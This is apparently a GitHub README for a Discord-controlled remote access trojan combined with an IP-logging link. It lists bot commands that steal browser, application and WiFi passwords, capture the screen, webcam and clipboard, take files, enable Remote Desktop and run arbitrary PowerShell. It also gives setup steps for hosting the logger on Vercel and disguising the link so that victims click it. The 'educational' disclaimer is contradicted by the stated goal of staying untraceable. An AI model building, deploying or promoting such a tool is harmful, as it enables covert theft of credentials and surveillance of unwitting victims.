# 📸 Discord Image Logger
 A V1.1 version with bugfixes, selfhosting capabilities, a better hosting platform, and more features will be coming soon!

**DISCORD RAT** is a simple yet powerful tool that I have created

Please note that this is **NOT** an "HACKING TOOL", but just an tool for being educated about shell commands

**If you're going to fork this repository, star it too while you're at it!**


# 💎 Features
* Fast, Free, and Easy!
* NOTE: its easily to reverse-engineere it. SO DONT USE IT AS HACKING TOOL 
* Requires only running it / compling it into an .EXE
* Have as many features as possible to make it untracable in the PDU'S
* ~~Under active development, many new features will be added!~~ Not so much, but a new version will be worked on soon! Drop ideas!

---

# 🔧 Configuration

Before setting it up, let's modify the **config.** <br>
Open up `bot.py` and edit the values, refer to the key below.

**WEBHOOK:** `Your DISCORD BOT HOOK!` <br>




* **2)** `RICHMESSAGE`
Rich Message allows you to insert variables such as the client's IP, Location, ASN, etc. for the Crashbrowser message. <br>
Simply insert anything in the following table and it will replace it respectively. <br>

| Commands |
|--------|
| `!kill` TERMINATE bot. |
| `!remove` Remove from startup |
| `!help` This menu but in discord chat <3|
| `!ping` Checek bot status |
| `!passwords` Browser passwords (obfscated urls) |
| `!apppass`  Application passwords |
| `!wifi` WiFi passwords |
| `!screenshot` Desktop screenshot |
| `!webcamss` Webcam screenshot |
| `!get <file>` Download an file |
| `!sysinfo` System information |
| `!clipboard` Get clipboard |
| `!active` Active window |
| `!remote` Enable Remote Desktop |
| `!unremote` Disable Remote Desktop |
| `!volume <0-100>` Set volume |
| `!lock` Lock workstation |
| `ANY OTHER COMMAND` Powershell execution |


---

# ⚒️ Setup

Now that you've got all that set up, let's install this thing! <br>


- **1:** Create a GitHub repository. I recommend it be private, so others can't see your webhook URL.
- **2:** Make a folder named `api`, and place `requirements.txt` and `main.py` in (Rename it whatever, e.g. catpicture.py would make the URL your.site/api/catepicture)
- **3:** (Optional) make a file in the main root (NOT IN API) named `index.html`, and put the code below in:
```html
<meta http-equiv="refresh" content="0;url=./api/main.py">
```
(You can replace main.py with whatever you made it!); The point of this step is so that you can just visit your.site and not your.site/api/main (The former seems much less suspicious) however note it may not preview on Discord if you do so. Still looking for a workaround for this.
- **4:** Visit https://vercel.com and log in with GitHub.
- **5:** Click *add new* to make a new project. Select the GitHub repository you made where it says **Import GitHub Repository**
- **6:** Copy the domain for you. It should be something like `project.vercel.app`, unless you did step #3 you'll have to add `api/main` to it, so it will look more like `project.vercel.app/api/main` *(Replace `project.vercel.app` with the domain it gave you, and `main` with whatever you named the file, WITHOUT THE `.py`, or else it will say potentially dangerous download)*, now send your link, have someone click Open Original/Open in Browser, and watch!

You can also add a domain if you have one!

---

# 🐛 Bug Reports & Suggestions

**Found a bug? Have an idea?** Let me know [here!](../../issues) Please provide a detailed explanation of the expected behavior, actual behavior, and steps to reproduce, or what you want to see and how it could be done. You can be a small part of this project!

**NOTE:** You are __NOT__ supposed to run `main.py`! Please read the instructions. I will not help if your bug report/issue is "main.py will not open".

**Active/known bugs:**.
None at the moment!

---

# 📜 Closing Statements

Liked the project? I know you did! Support me, **drop a star!** <br>
here my [Ko-fi link](https://ko-fi.com/rjewi) 
Thank you for choosing my tools! 🙏
